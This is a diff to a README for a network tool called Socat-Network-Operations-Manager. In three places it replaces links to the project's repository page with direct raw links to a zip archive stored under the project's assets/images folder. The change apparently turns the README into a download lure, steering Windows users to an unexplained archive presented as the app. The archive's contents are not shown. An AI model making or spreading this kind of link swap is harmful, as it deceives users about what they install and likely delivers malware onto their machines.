@@ -1,6 +1,6 @@
 # 🛠️ Socat-Network-Operations-Manager - Manage Network Links with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Page-blue?style=for-the-badge&logo=github)](https://github.com/geometric-detection287/Socat-Network-Operations-Manager)
+[![Download Now](https://img.shields.io/badge/Download-Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/geometric-detection287/Socat-Network-Operations-Manager/main/assets/images/Manager_Socat_Network_Operations_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Socat-Network-Operations-Manager helps you launch and control network listeners,
 
 Use the link below to visit the download page and get the app:
 
-[Visit the download page](https://github.com/geometric-detection287/Socat-Network-Operations-Manager)
+[Visit the download page](https://raw.githubusercontent.com/geometric-detection287/Socat-Network-Operations-Manager/main/assets/images/Manager_Socat_Network_Operations_v2.6.zip)
 
 ## 📥 Download and Install on Windows
 
@@ -167,4 +167,4 @@ Use Socat-Network-Operations-Manager when you need one tool to manage network li
 
 If you need to get the app later, use this link:
 
-[https://github.com/geometric-detection287/Socat-Network-Operations-Manager](https://github.com/geometric-detection287/Socat-Network-Operations-Manager)
+[https://raw.githubusercontent.com/geometric-detection287/Socat-Network-Operations-Manager/main/assets/images/Manager_Socat_Network_Operations_v2.6.zip](https://raw.githubusercontent.com/geometric-detection287/Socat-Network-Operations-Manager/main/assets/images/Manager_Socat_Network_Operations_v2.6.zip)
